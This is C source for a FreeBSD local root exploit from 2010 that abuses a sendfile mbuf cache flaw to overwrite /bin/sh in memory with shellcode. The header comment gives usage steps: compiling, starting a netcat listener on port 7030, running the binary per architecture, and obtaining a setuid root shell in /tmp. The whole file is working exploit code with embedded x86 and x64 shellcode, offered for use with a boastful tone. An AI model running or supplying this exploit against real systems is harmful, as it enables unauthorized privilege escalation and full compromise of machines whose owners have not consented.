/*
freebsd mbufs() sendfile cache poisoning-priv escalation
x86/x64 local root xpl v2 by Kingcope 2010

 tested on: 8.1-RC1, 8.0-RELEASE, 7.3-RELEASE and
 7.2-RELEASE-p8 (xd personally did 7.2 test)
 poisons /bin/sh to contain shellcode which does this...

 '
 chmod a+s /tmp/sh
 chown root /tmp/sh
 execve /tmp/sh2
 '
 how to use ths is VERY important it is NOT your standard type,
 DONT start a listener as normal...let this do its shit..
 and then again, there is a MUCH simpler way you could redo
 this exploit but, thats for you to find ;) -xd
 
 box 1 (TARGET):
 $ cp /bin/sh /tmp/sh
 $ cp /bin/sh /tmp/sh2
 $ gcc cache.c -o cache

 
 box 2 (LISTENER):
 $ nc -l 7030
 
 on box 1 do:
 for i386 type:
 $ ./cache 1
 for amd64 type:
 $ ./cache 2
 
 ok now lets hope this worked and injected the shellcode,should,
 /bin/sh should be execed by the system as root in ~5 mins if lucky :)
 
NOW DO:
 $ /tmp/sh
AND cleanup:
 # cp -f /tmp/sh2 /bin/sh
 enjoy the root shell!
*/

// this juarez is now private on #darknet
// http://www.youtube.com/watch?v=JtgInqNNpCI
// http://www.youtube.com/watch?v=IdbRWrY4QBI

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <strings.h>
#include <stdio.h>
#include <string.h>
#include <err.h>
 
main (int argc, char *argv[]) {

int s, f, k2;
struct sockaddr_in addr;
int flags;
 
char str32[]=
"\x31\xc0\x6a\x00\x68\x70\x2f\x73\x68\x68\x2f\x2f\x74\x6d\x89\xe3"
"\x50\x50\x53\xb0\x10\x50\xcd\x80\x68\xed\x0d\x00\x00\x53\xb0\x0f"
"\x50\xcd\x80\x31\xc0\x6a\x00\x68\x2f\x73\x68\x32\x68\x2f\x74\x6d"
"\x70\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80";
 
char str64[]=
"\x48\x31\xc0\x99\xb0\x10\x48\xbf\xff\x2f\x74\x6d\x70\x2f\x73\x68"
"\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05"
"\xb0\x0f\x48\x31\xf6\x66\xbe\xed\x0d\x0f\x05\x48\x31\xc0\x99\xb0"
"\x3b\x48\xbf\x2f\x74\x6d\x70\x2f\x73\x68\x32\x6a\x00\x57\x48\x89"
"\xe7\x57\x52\x48\x89\xe6\x0f\x05";
 
char buf[10000];
char *p;
struct stat sb;
int n;
fd_set wset;
int64_t size;
off_t sbytes;
off_t sent = 0;
int chunk;
int arch = 3;
if (argc != 2) {
printf("[+] Define architecture i386 or amd64 (1/2)\n");
return;
}

if (strcmp(argv[1], "1") == 0)
arch=1;
if (strcmp(argv[1], "2") == 0)
arch=2;
if (arch == 3) {
printf("[+] Define architecture i386 or amd64 (1/2)\n");
return;
}
s = socket(AF_INET, SOCK_STREAM, 0);
bzero(&addr, sizeof(addr));
addr.sin_family = AF_INET;
addr.sin_port = htons(7030);
addr.sin_addr.s_addr = inet_addr("127.0.0.1");
n = connect(s, (struct sockaddr *)&addr, sizeof (addr));
if (n < 0)
warn ("[-] Failed to connect");
f = open("/bin/sh", O_RDONLY);
if (f<0)
warn("[-] Failed to open file");
n = fstat(f, &sb);
if (n<0)
warn("[-] fstat failed");
size = sb.st_size;
chunk = 0;
flags = fcntl(f, F_GETFL);
flags |= O_NONBLOCK;
fcntl(f, F_SETFL, flags);
while (size > 0) {
FD_ZERO(&wset);
FD_SET(s, &wset);
n = select(f+1, NULL, &wset, NULL, NULL);
if (n < 0)
continue;
if (chunk > 0) {
sbytes = 0;
if (arch == 1)
n = sendfile(f, s, 2048*2, chunk, NULL, &sbytes,0);
if (arch == 2)
n = sendfile(f, s, 1204*6, chunk, NULL, &sbytes,0);
if (n < 0)
continue;
chunk -= sbytes;
size -= sbytes;
sent += sbytes;
continue;
}
chunk = 2048;
memset(buf, '\0', sizeof buf);
if (arch == 1) {
for (k2=0;k2<256;k2++) {
buf[k2] = 0x90;
}
p = buf;
p = p + k2;
memcpy(p, str32, sizeof str32);
n = k2 + sizeof str32;
p = buf;
}
if (arch == 2) {
for (k2=0;k2<100;k2++) {
buf[k2] = 0x90;
}
p = buf;
p = p + k2;
memcpy(p, str64, sizeof str64);
n = k2 + sizeof str64;
p = buf;
}
write(s, p, n);
}
}
